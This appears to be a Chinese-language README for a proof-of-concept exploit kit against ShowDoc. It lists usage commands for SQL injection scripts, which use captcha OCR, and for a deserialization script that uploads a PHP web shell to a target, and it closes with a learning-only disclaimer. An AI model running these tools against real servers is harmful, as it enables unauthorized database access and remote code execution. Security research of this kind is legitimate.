# showdoc_poc
## 需要条件

- phpggc: 用于生成序列化数据，而且需要设置为系统变量 (https://github.com/ambionics/phpggc)
- ddddocr: pip 需要安装ddddocr用于orc识别 (pip install ddddocr)

## 使用方法

### 注入

```
python3 sqli.py http://target
python3 sqliremote.py http://target http://ocr_server
```

### 反序列化

```
python3 unser.py http://target (远程shell文件名)rshell.php (本地shell文件路径)shell.php xxxxxxx(token)xxxxxxxx
```

## 注意⚠️
本脚本仅为demo学习使用，不一定适用于所有环境
注入脚本流量大，对网站造成损失概不负责
